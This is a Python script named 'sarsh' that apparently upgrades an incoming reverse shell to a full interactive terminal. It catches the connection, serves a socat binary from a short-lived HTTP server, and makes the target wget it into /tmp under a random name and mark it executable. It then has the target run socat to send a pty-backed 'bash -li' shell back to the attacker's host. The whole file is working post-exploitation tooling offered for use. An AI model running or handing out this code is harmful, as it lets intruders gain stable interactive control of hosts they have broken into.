#!/usr/bin/env python3
import socket
from random import randint
from os import system, path
from time import sleep
from sys import argv
import subprocess


class sarsh:

    def __init__(self, ip, port):
        self.lhost, self.lport = ip, port
        self.rhost, self.rport = None, None
        self.http_server_process = None
        self.tcp_server()
    
    def start_http_server(self, port):
        command = f"python3 -m http.server {port}"
        self.http_server_process = subprocess.Popen(
            command.split(), 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
            )

    def stop_http_server(self):
        if self.http_server_process is not None:
            self.http_server_process.terminate()
            self.http_server_process = None

    def send_socat(self, client_socket, filename):
        print("Transfering socat...")
        new_port = randint(60000, 63000)
        new_filename = ''.join(chr(randint(97, 122)) for _ in range(16))
        self.start_http_server(new_port)
        sleep(3)
        client_socket.send(f"wget http://{self.lhost}:{new_port}/socat -O /tmp/{new_filename} && chmod +x /tmp/{new_filename}\n".encode())
        sleep(3)
        print("\nSocat transfered!")
        print(f"Socat name on the target: /tmp/{new_filename}")
        self.stop_http_server()
        return new_filename

    def tcp_server(self):
        if not path.exists('./socat'):
            system('wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat && chmod +x ./socat')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind((self.lhost, self.lport))
            sock.listen(1)
            print(f"Listening on {self.lhost}:{self.lport}")
            client_socket, raddr = sock.accept()
            self.rhost, self.rport = raddr 
            print(f"Connection from {self.rhost}:{self.rport}")
            filename = self.send_socat(client_socket, "./socat")

            socat_port = randint(63000, 65000)
            client_socket.send(f"sleep 3; /tmp/{filename} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{self.lhost}:{socat_port}\n".encode())
            print("Waiting for connection...")
            print("To set term variable: $ export TERM=xterm")
            subprocess.run(f'./socat -v file:`tty`,raw,echo=0 TCP-L:{socat_port}', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
        except Exception as e:
            print(f"An error occurred: {format(e)}")
            
        finally:
            sleep(2)
            client_socket.close()
            sock.close()


if __name__ == "__main__":
    if len(argv) < 3:
        print("Usage: python3 sarsh.py <ip> <port>")
    else:
        sarsh(argv[1], int(argv[2]))
